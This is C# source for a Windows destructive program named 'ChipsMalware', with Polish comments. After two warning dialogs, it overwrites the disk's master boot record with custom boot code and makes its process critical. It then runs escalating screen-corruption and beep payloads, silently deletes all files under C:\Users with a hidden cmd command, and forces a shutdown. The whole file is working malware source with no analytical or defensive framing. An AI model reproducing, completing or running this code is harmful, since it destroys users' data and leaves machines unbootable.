using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.IO;

namespace ChipsMalware
{
    class Program
    {
        // --- API IMPORT ---
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hD, int x, int y, int w, int h, IntPtr hS, int xS, int yS, uint r);
        [DllImport("gdi32.dll")] static extern uint SetPixel(IntPtr hdc, int x, int y, uint color);
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string n, uint a, uint s, IntPtr p, uint c, uint f, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("user32.dll")] static extern bool SetProcessDefaultLayout(uint dw);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int n);
        [DllImport("kernel32.dll")] static extern bool Beep(uint f, uint d);

        static Random rnd = new Random();

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();

            // 1. OSTRZEŻENIA (Standard)
            if (MessageBox.Show("Warning: Your computer will be destroyed by malware.", "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Hand) != DialogResult.Yes) return;
            if (MessageBox.Show("THIS IS YOUR FINAL WARNING...", "LAST WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Stop) != DialogResult.Yes) return;

            // INSTANT MBR KILL (Cichy zabójca w tle)
            OverwriteMBR();

            // Ochrona procesu
            int crit = 1;
            try { NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref crit, 4); } catch { }

            // --- START PROGRESYWNEJ DESTRUKCJI ---
            Run_Slow_Destruction();

            Application.Run(new Form() { Opacity = 0, ShowInTaskbar = false });
        }

        static void Run_Slow_Destruction()
        {
            new Thread(() => {
                // FAZA 1: NIEPOKÓJ (Pierwsze 15 sekund)
                // Drobne dźwięki, rzadkie MsgBoxy, pojedyncze martwe piksele.
                for (int i = 0; i < 15; i++) {
                    if (i % 5 == 0) new Thread(() => MessageBox.Show("Chips are coming...", "CHIPS", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
                    Beep((uint)rnd.Next(800, 1200), 100);
                    Thread.Sleep(1000);
                }

                // FAZA 2: ZAKŁÓCENIA (15-30 sekunda)
                // Zmiana układu na ARABSKI (RTL), pierwsze śnieżenie (rzadkie).
                SetProcessDefaultLayout(1); 
                new Thread(Payload_Snow_Light).Start();
                Thread.Sleep(15000);

                // FAZA 3: KRUSZENIE (30-50 sekunda)
                // Wchodzi Tunel i Inwersja kolorów, częstszy spam.
                new Thread(Payload_Visuals).Start();
                Thread.Sleep(20000);

                // FAZA 4: TOTALNY CRUNCH (Finał)
                // Agresywne kasowanie plików i głośny pisk.
                Execute_The_Final_Crunch();
            }).Start();
        }

        static void Payload_Snow_Light()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true) {
                for (int i = 0; i < 100; i++) // Delikatny szum
                    SetPixel(hdc, rnd.Next(w), rnd.Next(h), (uint)(rnd.Next(2) == 0 ? 0xFFFFFF : 0x000000));
                Thread.Sleep(10);
            }
        }

        static void Payload_Visuals()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
            while (true) {
                // Wolne "zapadanie się" ekranu (Tunel)
                BitBlt(hdc, 2, 2, w - 4, h - 4, hdc, 0, 0, 0x00CC0020);
                if (rnd.Next(100) > 97) BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, 0x00550009); // Błysk negatywu
                Thread.Sleep(30);
            }
        }

        static void Execute_The_Final_Crunch()
        {
            // Pisk przed śmiercią
            new Thread(() => { for(int i=0; i<5; i++) Beep(4000, 200); }).Start();
            
            // Kasowanie plików
            Process.Start(new ProcessStartInfo("cmd.exe", "/c del /s /q /f C:\\Users\\*.*") { WindowStyle = ProcessWindowStyle.Hidden });
            
            // Shutdown
            Thread.Sleep(5000);
            Process.Start("shutdown", "-s -t 0 -f -c \"Sorry, this virus can't be turned off. lol\"");
        }

        static void OverwriteMBR()
        {
            byte[] mbr = new byte[512];
            byte[] bootCode = new byte[] {
                0xB8, 0x13, 0x00, 0xCD, 0x10, // VGA 13h
                0xBB, 0x00, 0xA0, 0x8E, 0xC3, // DS -> A000 (Video)
                0xBE, 0x60, 0x7C,             // Tekst
                0xB4, 0x0E, 0xAC, 0x08, 0xC0, 0x74, 0x04, 0xCD, 0x10, 0xEB, 0xF7, // Pętla tekstu
                0x31, 0xFF, 0xB8, 0x2C, 0xAA, 0x47, 0x81, 0xFF, 0x40, 0xFA, 0x75, 0xF7, 0xEB, 0xFE // Animacja Chipsa
            };
            string msg = "\r\nChips Be Here, the computer was eaten by: Chips\0";
            byte[] msgBytes = Encoding.ASCII.GetBytes(msg);
            Array.Copy(bootCode, 0, mbr, 0, bootCode.Length);
            Array.Copy(msgBytes, 0, mbr, 0x60, msgBytes.Length);
            mbr[510] = 0x55; mbr[511] = 0xAA;

            try {
                uint w;
                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1 | 2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(h, mbr, 512, out w, IntPtr.Zero);
            } catch { }
        }
    }
}
